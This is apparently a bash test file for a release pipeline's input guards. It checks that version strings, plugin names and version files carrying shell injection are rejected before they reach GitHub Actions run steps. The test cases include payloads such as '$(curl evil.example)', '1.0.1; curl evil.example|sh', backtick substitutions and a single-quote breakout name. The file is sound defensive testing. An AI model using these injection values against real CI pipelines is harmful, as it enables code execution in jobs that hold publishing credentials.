#!/usr/bin/env bash
set -uo pipefail

# Tests the version-format guard in detect-all-changes.sh.
#
# The versions that script reads are echoed into GITHUB_OUTPUT and then
# interpolated with ${{ }} into `run:` blocks across the release pipeline.
# GitHub expands ${{ }} textually BEFORE the shell parses the line, so a version
# file containing command substitution would execute rather than be quoted. The
# guard rejects anything that is not a plain version string, at the one place the
# value enters the pipeline.
#
# detect-all-changes.sh cannot be sourced directly - it runs git queries and exits
# on its own - so this extracts the guard function from the real script and
# exercises that, rather than restating it here.
#
# Usage: ./version-format.test.sh

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TARGET="${SCRIPT_DIR}/detect-all-changes.sh"

for guard in validate_version validate_plugin_name; do
  if ! grep -q "^${guard}()" "$TARGET"; then
    echo "FAIL: detect-all-changes.sh defines no ${guard}() guard" >&2
    exit 1
  fi
done

# Extract just the function definitions, each up to its closing brace at column 0.
FN="$(awk '/^validate_version\(\)/,/^}/' "$TARGET")
$(awk '/^validate_plugin_name\(\)/,/^}/' "$TARGET")"

passed=0
failed=0

expect_accept() {
  if (eval "$FN"; validate_version "$1" "test") >/dev/null 2>&1; then
    echo "  ok - accepts $1"
    passed=$((passed + 1))
  else
    echo "FAIL: rejected a valid version: $1" >&2
    failed=$((failed + 1))
  fi
}

expect_reject() {
  if (eval "$FN"; validate_version "$1" "test") >/dev/null 2>&1; then
    echo "FAIL: accepted a malformed version: $1" >&2
    failed=$((failed + 1))
  else
    echo "  ok - rejects $1"
    passed=$((passed + 1))
  fi
}

# The shapes the repo actually ships. The prerelease forms are not hypothetical:
# `git tag` carries 38 of them, including the multi-hyphen
# transports/v1.5.0-prerelease3-ajhfix-base. A guard that rejected these would block
# a release, so they are pinned here.
expect_accept "1.6.9"
expect_accept "v1.6.9"
expect_accept "1.6.9-rc.1"
expect_accept "v2.0.0-beta1"
expect_accept "1.6.9-prerelease1"
expect_accept "1.6.9-prerelease2"
expect_accept "v2.0.0-prerelease1"
expect_accept "v1.5.0-prerelease3-ajhfix-base"
expect_accept "2.0.0-prerelease1+build.5"

# Injection shapes: each of these reaches a shell via ${{ }} textual expansion.
expect_reject '1.6.9$(id)'
expect_reject '1.6.9`id`'
expect_reject '1.6.9; id'
expect_reject '1.6.9 && id'
expect_reject '$(curl evil.example)'
expect_reject '1.6.9|id'
expect_reject '1.6.9
id'

# Plainly malformed values are rejected too.
expect_reject ""
expect_reject "not-a-version"

# Structure, not just characters. These are all shell-inert, so they are a
# correctness concern rather than an injection one - but a guard that advertises
# MAJOR.MINOR.PATCH and then accepts a fourth component or a letter inside the
# numeric part would let a bad version file reach tag construction unnoticed.
expect_reject "1x.2.3"
expect_reject "1.2.3rc1"
expect_reject "1.2.3.4"
expect_reject "1.2"
expect_reject "1.2.x"
expect_reject "v1.2"
expect_reject ".1.2.3"

# A separator that introduces nothing. Semantic Versioning 2.0.0 clauses 9 and 10 both
# say identifiers MUST NOT be empty, and its BNF has no production for a blank one, so
# these are malformed rather than merely untidy - and a trailing bare separator is the
# shape a truncated or partially-written version file takes.
expect_reject "1.2.3-"
expect_reject "1.2.3+"
expect_reject "v1.2.3-"
expect_reject "v1.2.3+"


# ---------------------------------------------------------------------------------
# Plugin names. These reach a shell too, and by a nastier route than the versions:
# they are collected into the changed-plugins JSON and interpolated at
# release-pipeline.yml as '${{ needs.detect-changes.outputs.changed-plugins }}'.
# jq -R escapes double quotes and backslashes when building that JSON, but NOT single
# quotes - and the interpolation sits inside single quotes in the shell, so a name
# carrying one closes the string.
# ---------------------------------------------------------------------------------

expect_name_accept() {
  if (eval "$FN"; validate_plugin_name "$1") >/dev/null 2>&1; then
    echo "  ok - accepts plugin name $1"
    passed=$((passed + 1))
  else
    echo "FAIL: rejected a real plugin name: $1" >&2
    failed=$((failed + 1))
  fi
}

expect_name_reject() {
  if (eval "$FN"; validate_plugin_name "$1") >/dev/null 2>&1; then
    echo "FAIL: accepted a malformed plugin name: $1" >&2
    failed=$((failed + 1))
  else
    echo "  ok - rejects plugin name $1"
    passed=$((passed + 1))
  fi
}

# Every plugin directory currently in the repo.
for real_name in compat governance jsonparser logging maxim mocker \
                 modelcatalogresolver otel prompts semanticcache telemetry test-reports; do
  expect_name_accept "$real_name"
done

# The single quote is the one that matters for the '...' interpolation site.
expect_name_reject "foo'; id; '"
expect_name_reject 'foo"; id'
expect_name_reject 'foo$(id)'
expect_name_reject 'foo`id`'
expect_name_reject "foo bar"
expect_name_reject "../etc"
expect_name_reject ""


# ---------------------------------------------------------------------------------
# read-version-file.sh: the guard for the versions detect-all-changes.sh does not
# read (cli/version, scripts/bifrost-migration-cli/version, npx/bifrost-cli). Those
# reach `run:` lines in release-cli.yml, release-bifrost-migration-cli.yml and
# npx-publish.yml, in steps holding GH_TOKEN, R2 and npm credentials.
# ---------------------------------------------------------------------------------

READER="${SCRIPT_DIR}/read-version-file.sh"
TMPDIR_VF="$(mktemp -d)"
trap 'rm -rf "$TMPDIR_VF"' EXIT

expect_file_accept() {
  local path="$1" want="$2" out
  out="$TMPDIR_VF/out"
  : > "$out"
  if GITHUB_OUTPUT="$out" "$READER" "$path" pkg >/dev/null 2>&1 \
    && grep -qx "version=${want}" "$out" && grep -qx "full-tag=pkg/v${want}" "$out"; then
    echo "  ok - reads $want from $(basename "$path")"
    passed=$((passed + 1))
  else
    echo "FAIL: read-version-file.sh did not emit version=${want} for $(basename "$path")" >&2
    failed=$((failed + 1))
  fi
}

expect_file_reject() {
  local path="$1" label="$2" out
  out="$TMPDIR_VF/out"
  : > "$out"
  if GITHUB_OUTPUT="$out" "$READER" "$path" >/dev/null 2>&1 || [ -s "$out" ]; then
    echo "FAIL: read-version-file.sh accepted $label" >&2
    failed=$((failed + 1))
  else
    echo "  ok - read-version-file.sh rejects $label"
    passed=$((passed + 1))
  fi
}

printf '1.0.0\n' > "$TMPDIR_VF/version"
expect_file_accept "$TMPDIR_VF/version" "1.0.0"
printf '2.1.0-rc.1' > "$TMPDIR_VF/version"
expect_file_accept "$TMPDIR_VF/version" "2.1.0-rc.1"
printf '{"name":"x","version":"1.0.1"}' > "$TMPDIR_VF/package.json"
expect_file_accept "$TMPDIR_VF/package.json" "1.0.1"

printf '1.0.1$(id)\n' > "$TMPDIR_VF/version"
expect_file_reject "$TMPDIR_VF/version" 'a version file holding $(id)'
printf '1.0.1\nversion=9.9.9\n' > "$TMPDIR_VF/version"
expect_file_reject "$TMPDIR_VF/version" 'a multi-line version file'
printf '1.0.1`id`' > "$TMPDIR_VF/version"
expect_file_reject "$TMPDIR_VF/version" 'a version file holding backticks'
printf '{"version":"1.0.1; curl evil.example|sh"}' > "$TMPDIR_VF/package.json"
expect_file_reject "$TMPDIR_VF/package.json" 'a package.json version holding a command'
printf '{"name":"x"}' > "$TMPDIR_VF/package.json"
expect_file_reject "$TMPDIR_VF/package.json" 'a package.json with no version'
expect_file_reject "$TMPDIR_VF/missing" 'a missing file'

# Only the trailing line ending is stripped. Deleting every whitespace character
# would join a split file into a version it never contained: "1.0.1" over "0"
# would publish 1.0.10.
printf '1.0.0\r\n' > "$TMPDIR_VF/version"
expect_file_accept "$TMPDIR_VF/version" "1.0.0"
printf '1.0.1\n0\n' > "$TMPDIR_VF/version"
expect_file_reject "$TMPDIR_VF/version" 'a version split across lines (1.0.1 / 0)'
printf '1.0.\n0' > "$TMPDIR_VF/version"
expect_file_reject "$TMPDIR_VF/version" 'a version split across lines (1.0. / 0)'
printf '1.0.1 0\n' > "$TMPDIR_VF/version"
expect_file_reject "$TMPDIR_VF/version" 'a version holding a space'
printf '1.0.\t1\n' > "$TMPDIR_VF/version"
expect_file_reject "$TMPDIR_VF/version" 'a version holding a tab'

# Strict SemVer 2.0.0: these feed npm publish, which refuses anything else, so
# they are rejected here before a tag or release is created for them.
for v in 1.0.0-0 1.0.0-alpha-1 1.0.0-x.7.z.92 1.0.0-0a.1 2.0.0+build.05 1.0.0-rc.1+sha.5114f85; do
  printf '%s\n' "$v" > "$TMPDIR_VF/version"
  expect_file_accept "$TMPDIR_VF/version" "$v"
done
for v in 1.0.0-.. 01.2.3 1.02.3 1.2.03 1.0.0-01 1.0.0-rc..1 1.0.0-rc. 1.0.0+build..1 1.0.0-rc_1; do
  printf '%s\n' "$v" > "$TMPDIR_VF/version"
  expect_file_reject "$TMPDIR_VF/version" "non-SemVer $v"
done

# extract-npx-version.sh reads npx/bifrost/package.json relative to the working
# directory and feeds the other npm publish, so it gets the same SemVer matrix.
NPX_EXTRACT="${SCRIPT_DIR}/extract-npx-version.sh"
mkdir -p "$TMPDIR_VF/npx-root/npx/bifrost"
expect_npx() {
  local want="$1" v="$2" out="$TMPDIR_VF/npx-out" rc=0
  : > "$out"
  printf '{"name":"x","version":"%s"}' "$v" > "$TMPDIR_VF/npx-root/npx/bifrost/package.json"
  (cd "$TMPDIR_VF/npx-root" && GITHUB_OUTPUT="$out" "$NPX_EXTRACT") >/dev/null 2>&1 || rc=$?
  if [[ "$want" == accept && $rc -eq 0 ]] && grep -qx "version=${v}" "$out"; then
    echo "  ok - extract-npx-version.sh accepts $v"; passed=$((passed + 1))
  elif [[ "$want" == reject && $rc -ne 0 && ! -s "$out" ]]; then
    echo "  ok - extract-npx-version.sh rejects $v"; passed=$((passed + 1))
  else
    echo "FAIL: extract-npx-version.sh should $want $v (rc=$rc)" >&2; failed=$((failed + 1))
  fi
}
for v in 1.6.3 1.0.0-rc.1 1.0.0-0 2.0.0+build.05; do expect_npx accept "$v"; done
for v in 1.0.0-.. 01.2.3 1.0.0-01 1.0.0-rc..1 '1.0.0$(id)'; do expect_npx reject "$v"; done

# No workflow may read a version straight into GITHUB_OUTPUT: that is exactly the
# shape release-cli.yml had before read-version-file.sh. Workflows read versions
# through a validating script instead.
raw_reads=$(grep -nE '\$\(cat [^)]*version\)|jq -r .\.version' "${SCRIPT_DIR}/../"*.yml || true)
if [ -n "$raw_reads" ]; then
  echo "FAIL: workflow reads a version without validating it; use scripts/read-version-file.sh:" >&2
  echo "$raw_reads" >&2
  failed=$((failed + 1))
else
  echo "  ok - no workflow reads a version file unvalidated"
  passed=$((passed + 1))
fi

echo ""
if [ "$failed" -ne 0 ]; then
  echo "$failed failed, $passed passed" >&2
  exit 1
fi
echo "$passed passed"
